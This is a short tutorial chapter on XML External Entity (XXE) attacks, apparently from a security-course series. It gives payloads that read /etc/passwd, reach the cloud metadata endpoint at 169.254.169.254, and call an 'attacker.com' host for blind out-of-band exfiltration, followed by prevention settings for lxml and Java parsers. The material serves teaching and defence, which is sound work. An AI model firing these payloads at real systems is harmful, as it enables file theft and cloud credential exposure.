# XML External Entities (XXE)

XXE attacks exploit XML external entity processing to read files, perform SSRF, or cause DoS.

## Basic XXE Payloads

### File Reading
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### SSRF via XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

### Blind XXE (Out-of-band)
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/collect">
  %xxe;
]>
```

## XXE in Different Contexts
- **SVG Upload** - XXE in SVG XML metadata
- **SOAP/XML-RPC** - XXE in SOAP body
- **XLSX/DOCX** - Office docs are ZIP + XML, modify sharedStrings.xml
- **PDF (FDF)** - Some PDF generators accept XML form data

## Blind XXE Detection
Use external callback services: Burp Collaborator, Interactsh, webhook.site

## Prevention
1. Disable XML external entity processing
2. Use JSON instead of XML where possible
3. Disable DTD processing entirely
4. Update XML libraries (many had default XXE)

```python
# Python lxml
parser = etree.XMLParser(resolve_entities=False, no_network=True)

# Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

---

> **Next**: [Command Injection](13-command-injection.md)
